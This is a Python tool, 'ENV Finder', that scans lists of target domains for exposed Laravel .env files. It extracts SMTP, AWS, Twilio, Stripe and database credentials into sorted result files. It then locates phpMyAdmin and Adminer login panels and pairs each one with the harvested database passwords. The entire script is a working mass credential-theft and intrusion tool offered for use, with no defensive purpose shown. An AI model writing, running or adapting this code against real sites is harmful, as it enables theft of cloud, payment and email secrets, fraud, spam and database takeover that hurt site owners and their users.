import requests
import os
import re
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from colorama import Fore, Style, init

init(autoreset=True)
LIME = Fore.LIGHTGREEN_EX

banner = f"""{LIME}{Style.BRIGHT}
╔════════════════════════════════════════════════════════╗
║                                                        ║
║              ENV Finder By Bob Marley  	             ║
║                                                        ║
╚════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
print(banner)

print(f"{LIME}{Style.BRIGHT}How To Use:")
print(f"{LIME}{Style.BRIGHT}1. Prepare a text file with your target domains, one per line.")
print(f"{LIME}{Style.BRIGHT}2. Run the script and follow the prompts.\n{Style.RESET_ALL}")

path = [
    "/.env", "/vendor/.env", "/lib/.env", "/lab/.env", "/cronlab/.env", "/cron/.env", "/core/.env", "/core/app/.env",
    "/core/Database/.env", "/database/.env", "/config/.env", "/assets/.env", "/app/.env", "/apps/.env", "/uploads/.env",
    "/sitemaps/.env", "/site/.env", "/admin/.env", "/web/.env", "/public/.env", "/en/.env", "/tools/.env", "/v1/.env",
    "/administrator/.env", "/laravel/.env"
]

phpmyadmin_paths = [
    "/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/PMA/", "/dbadmin/", "/mysql/", "/myadmin/"
]
adminer_paths = [
    "/adminer/", "/adminer.php", "/adm.php"
]

found_urls = set()
found_phpmyadmin = set()
found_adminer = set()
db_creds_dict = {}  # {site_base: (host, user, pass, name)}

def safe_find(pattern, text):
    m = re.search(pattern, text, re.MULTILINE)
    return m.group(1).strip() if m else ''

def grab_smtp(url, text):
    if 'MAIL_HOST' in text:
        mailhost = safe_find(r'^MAIL_HOST\s*=\s*(.*)', text)
        mailport = safe_find(r'^MAIL_PORT\s*=\s*(.*)', text)
        mailuser = safe_find(r'^MAIL_USERNAME\s*=\s*(.*)', text)
        mailpass = safe_find(r'^MAIL_PASSWORD\s*=\s*(.*)', text)
        mailfrom = safe_find(r'^MAIL_FROM_ADDRESS\s*=\s*(.*)', text)
        fromname = safe_find(r'^MAIL_FROM_NAME\s*=\s*(.*)', text)
        if not mailuser or not mailpass or mailuser.lower() == "null" or mailpass.lower() == "null":
            return False
        build = f'URL: {url}\nMAILHOST: {mailhost}\nMAILPORT: {mailport}\nMAILUSER: {mailuser}\nMAILPASS: {mailpass}\nMAILFROM: {mailfrom}\nFROMNAME: {fromname}'
        build = build.replace('\r', '')
        if 'sendgrid' in mailhost:
            filename = 'sendgrid.txt'
        elif 'office365' in mailhost or 'outlook.office365.com' in mailhost or 'smtp.office365.com' in mailhost:
            filename = 'office.txt'
        elif '1and1' in mailhost or '1und1' in mailhost:
            filename = '1and1.txt'
        elif 'zoho' in mailhost:
            filename = 'zoho.txt'
        elif 'mandrillapp' in mailhost or 'mandrill' in mailhost:
            filename = 'mandrill.txt'
        elif 'mailgun' in mailhost:
            filename = 'mailgun.txt'
        else:
            filename = 'SMTP_RANDOM.txt'
        with open(f'Results/{filename}', 'a', encoding='utf-8') as f:
            f.write(build + '\n\n')
        return True
    return False

def grab_aws(url, text):
    aws_key = safe_find(r'^AWS_ACCESS_KEY_ID\s*=\s*(.*)', text)
    aws_secret = safe_find(r'^AWS_SECRET_ACCESS_KEY\s*=\s*(.*)', text)
    aws_region = safe_find(r'^AWS_DEFAULT_REGION\s*=\s*(.*)', text)
    if aws_key and aws_secret:
        build = f'URL: {url}\nAWS_ACCESS_KEY_ID: {aws_key}\nAWS_SECRET_ACCESS_KEY: {aws_secret}\nAWS_DEFAULT_REGION: {aws_region}'
        with open('Results/aws.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n\n')
        return True
    return False

def grab_twilio(url, text):
    sid = safe_find(r'^TWILIO_ACCOUNT_SID\s*=\s*(.*)', text)
    token = safe_find(r'^TWILIO_AUTH_TOKEN\s*=\s*(.*)', text)
    api_key = safe_find(r'^TWILIO_API_KEY\s*=\s*(.*)', text)
    api_secret = safe_find(r'^TWILIO_API_SECRET\s*=\s*(.*)', text)
    if sid and token:
        build = f'URL: {url}\nTWILIO_ACCOUNT_SID: {sid}\nTWILIO_AUTH_TOKEN: {token}\nTWILIO_API_KEY: {api_key}\nTWILIO_API_SECRET: {api_secret}'
        with open('Results/twilio.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n\n')
        return True
    return False

def grab_stripe(url, text):
    stripe_key = safe_find(r'^STRIPE_KEY\s*=\s*(.*)', text)
    stripe_secret = safe_find(r'^STRIPE_SECRET\s*=\s*(.*)', text)
    if stripe_key and stripe_secret:
        build = f'URL: {url}\nSTRIPE_KEY: {stripe_key}\nSTRIPE_SECRET: {stripe_secret}'
        with open('Results/stripe.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n\n')
        return True
    return False

def grab_db(site_base, url, text):
    db_conn = safe_find(r'^DB_CONNECTION\s*=\s*(.*)', text)
    db_host = safe_find(r'^DB_HOST\s*=\s*(.*)', text)
    db_port = safe_find(r'^DB_PORT\s*=\s*(.*)', text)
    db_name = safe_find(r'^DB_DATABASE\s*=\s*(.*)', text)
    db_user = safe_find(r'^DB_USERNAME\s*=\s*(.*)', text)
    db_pass = safe_find(r'^DB_PASSWORD\s*=\s*(.*)', text)
    creds_tuple = (db_conn, db_host, db_port, db_name, db_user, db_pass)
    if all(creds_tuple):
        db_creds_dict[site_base] = creds_tuple
        build = f'URL: {url}\nDB_CONNECTION: {db_conn}\nDB_HOST: {db_host}\nDB_PORT: {db_port}\nDB_DATABASE: {db_name}\nDB_USERNAME: {db_user}\nDB_PASSWORD: {db_pass}'
        with open('Results/Database.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n\n')
        return creds_tuple
    return None

def format_phpmyadmin(url, creds):
    if creds:
        db_user = creds[4]
        db_pass = creds[5]
        return f"{url}\nUSER: {db_user}\nPASS: {db_pass}\n\n"
    else:
        return ""

def format_adminer(url, creds):
    if creds:
        db_host = creds[1]
        db_user = creds[4]
        db_pass = creds[5]
        db_name = creds[3]
        return f"{url}\nHOST: {db_host}\nUSER: {db_user}\nPASS: {db_pass}\nNAME: {db_name}\n\n"
    else:
        return ""

def check_phpmyadmin(site_base):
    creds = db_creds_dict.get(site_base)
    if not creds:
        return  # Only proceed if DB creds exist
    for pma_path in phpmyadmin_paths:
        url = site_base.rstrip('/') + pma_path
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200 and ("phpmyadmin" in resp.text.lower() or "phpMyAdmin" in resp.text):
                if url not in found_phpmyadmin:
                    found_phpmyadmin.add(url)
                    print(f"{Fore.LIGHTGREEN_EX}[phpMyAdmin FOUND] {url}{Style.RESET_ALL}")
                    with open('Results/phpmyadmin.txt', 'a', encoding='utf-8') as f:
                        f.write(format_phpmyadmin(url, creds))
                break
        except Exception:
            continue

def check_adminer(site_base):
    creds = db_creds_dict.get(site_base)
    if not creds:
        return  # Only proceed if DB creds exist
    for adm_path in adminer_paths:
        url = site_base.rstrip('/') + adm_path
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200 and ("adminer" in resp.text.lower()):
                if url not in found_adminer:
                    found_adminer.add(url)
                    print(f"{Fore.LIGHTGREEN_EX}[Adminer FOUND] {url}{Style.RESET_ALL}")
                    with open('Results/adminer.txt', 'a', encoding='utf-8') as f:
                        f.write(format_adminer(url, creds))
                break
        except Exception:
            continue

def get_site_base(site):
    m = re.match(r'(https?://[^/]+)', site)
    return m.group(1) if m else site

def exploit(target):
    if '://' not in target:
        site = 'http://' + target
    else:
        site = target
    site_base = get_site_base(site)
    for read_path in path:
        exploit_path = site_base.rstrip('/') + read_path
        try:
            resp = requests.get(exploit_path, timeout=10)
            if resp.status_code == 200 and "APP_NAME" in resp.text:
                if exploit_path not in found_urls:
                    found_urls.add(exploit_path)
                    print(f"{Fore.LIGHTGREEN_EX}[FOUND] {exploit_path}{Style.RESET_ALL}")
                    with open('Results/env.txt', 'a', encoding='utf-8') as f:
                        f.write(exploit_path + '\n')
                    grab_smtp(exploit_path, resp.text)
                    grab_aws(exploit_path, resp.text)
                    grab_twilio(exploit_path, resp.text)
                    grab_stripe(exploit_path, resp.text)
                    grab_db(site_base, exploit_path, resp.text)
                break
            else:
                print(f"{Fore.LIGHTYELLOW_EX}[FAILED] {exploit_path} (status {resp.status_code}){Style.RESET_ALL}")
        except Exception as error:
            print(f"{Fore.LIGHTRED_EX}[BAD WEBSITE] {exploit_path} ({error}){Style.RESET_ALL}")
    check_phpmyadmin(site_base)
    check_adminer(site_base)

def identify_directory():
    print(f'{Fore.LIGHTCYAN_EX}[?] Checking Results folder....{Style.RESET_ALL}')
    try:
        os.mkdir('Results')
        print(f'{Fore.LIGHTGREEN_EX}[!] Folder Results Created !{Style.RESET_ALL}')
    except:
        print(f'{Fore.LIGHTYELLOW_EX}[!] Folder Results already exist{Style.RESET_ALL}')
    print("")

def main_scanner():
    quest = input(f'{Fore.LIGHTCYAN_EX}[x] List site : {Style.RESET_ALL}')
    with open(quest, 'r', encoding='utf-8') as f:
        read_list = f.read().splitlines()
    for read_line in read_list:
        exploit(read_line)

def threaded_scanner():
    quest = input(f'{Fore.LIGHTCYAN_EX}[x] List site : {Style.RESET_ALL}')
    while True:
        try:
            ask_thread = int(input(f'{Fore.LIGHTCYAN_EX}Thread : (1-10) {Style.RESET_ALL}'))
            if 1 <= ask_thread <= 10:
                break
            else:
                print(f"{Fore.LIGHTRED_EX}Please enter a number between 1 and 10.{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.LIGHTRED_EX}Invalid input. Please enter a number.{Style.RESET_ALL}")
    with open(quest, 'r', encoding='utf-8') as f:
        read_list = f.read().splitlines()
    start = timer()
    pp = ThreadPool(ask_thread)
    pp.map(exploit, read_list)
    pp.close()
    pp.join()
    print(f"{Fore.LIGHTGREEN_EX}Done in {timer() - start:.2f} seconds{Style.RESET_ALL}")

def banner_menu():
    print(f'{Fore.LIGHTCYAN_EX}1. With Thread (1-10){Style.RESET_ALL}')
    print(f'{Fore.LIGHTCYAN_EX}2. Without Thread{Style.RESET_ALL}')

if __name__ == "__main__":
    identify_directory()
    banner_menu()
    ask = input(f'{Fore.LIGHTCYAN_EX}[x] choose : {Style.RESET_ALL}')
    if ask == '1':
        threaded_scanner()
    elif ask == '2':
        main_scanner()
    else:
        print(f'{Fore.LIGHTRED_EX}Wrong input !!!{Style.RESET_ALL}')
